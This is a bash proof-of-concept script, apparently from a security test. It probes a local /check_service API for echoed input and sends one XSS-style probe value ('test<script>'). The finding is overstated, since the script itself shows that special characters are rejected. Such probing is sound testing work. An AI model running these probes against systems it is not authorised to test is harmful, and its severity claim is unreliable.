#!/bin/bash

# POC: API Response Data Reflection - Service Status Endpoint
# This script demonstrates the data reflection vulnerability where the /check_service
# endpoint echoes back user-supplied 'service_name' parameter in the JSON response

TARGET="http://localhost:8080"
ENDPOINT="/check_service"

echo "=========================================="
echo "API Response Data Reflection POC"
echo "=========================================="
echo ""

# Test 1: Normal service check - demonstrates reflection
echo "[*] Test 1: Checking 'apache' service"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -d '{"service_name": "apache"}')
echo "Request: POST $TARGET$ENDPOINT"
echo "Body: {\"service_name\": \"apache\"}"
echo "Response: $RESPONSE"
echo ""

# Extract and verify reflection
if echo "$RESPONSE" | grep -q '"service_name":"apache"'; then
    echo "[+] VULNERABILITY CONFIRMED: service_name parameter is reflected in response"
else
    echo "[-] No reflection detected"
    exit 1
fi
echo ""

# Test 2: Verify reflection with different service names
echo "[*] Test 2: Checking 'mysql' service"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -d '{"service_name": "mysql"}')
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"service_name":"mysql"'; then
    echo "[+] Parameter value 'mysql' is reflected"
fi
echo ""

# Test 3: Verify reflection with another service
echo "[*] Test 3: Checking 'nginx' service"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -d '{"service_name": "nginx"}')
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"service_name":"nginx"'; then
    echo "[+] Parameter value 'nginx' is reflected"
fi
echo ""

# Test 4: Demonstrate validation - special characters are rejected
echo "[*] Test 4: Testing with special characters (payload with < character)"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -d '{"service_name": "test<script>"}')
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "error\|400\|Invalid"; then
    echo "[+] Input validation detected - special characters rejected"
else
    echo "[-] No validation detected"
fi
echo ""

# Test 5: Show reflection without encoding (information exposure)
echo "[*] Test 5: Demonstrate information exposure through reflection"
echo "The endpoint reflects the exact service_name value without re-encoding or sanitization."
echo ""
echo "Potential exploitation scenarios:"
echo "1. If validation is bypassed, XSS payloads could be reflected"
echo "2. API responses are logged/cached without sanitization"
echo "3. Third-party clients consuming this API might not properly escape the response"
echo "4. The reflection pattern itself represents data exposure"
echo ""

# Test 6: Verify response structure
echo "[*] Test 6: Verify JSON structure and reflection pattern"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -d '{"service_name": "ssh"}')
echo "Full response: $RESPONSE"

# Check if both status and service_name are in response
if echo "$RESPONSE" | grep -q '"status"'; then
    echo "[+] Response contains status field"
fi
if echo "$RESPONSE" | grep -q '"service_name"'; then
    echo "[+] Response contains service_name field (REFLECTION DETECTED)"
fi
echo ""

echo "=========================================="
echo "CONCLUSION: API Response Data Reflection"
echo "=========================================="
echo "The /check_service endpoint reflects the service_name parameter directly in the"
echo "JSON response. While current input validation prevents most XSS payloads, this"
echo "reflection pattern is an information exposure risk and could be exploited if:"
echo "- Validation is bypassed"
echo "- The API is used by other clients without proper escaping"
echo "- The response is used in other contexts (logging, storage, etc.)"
echo ""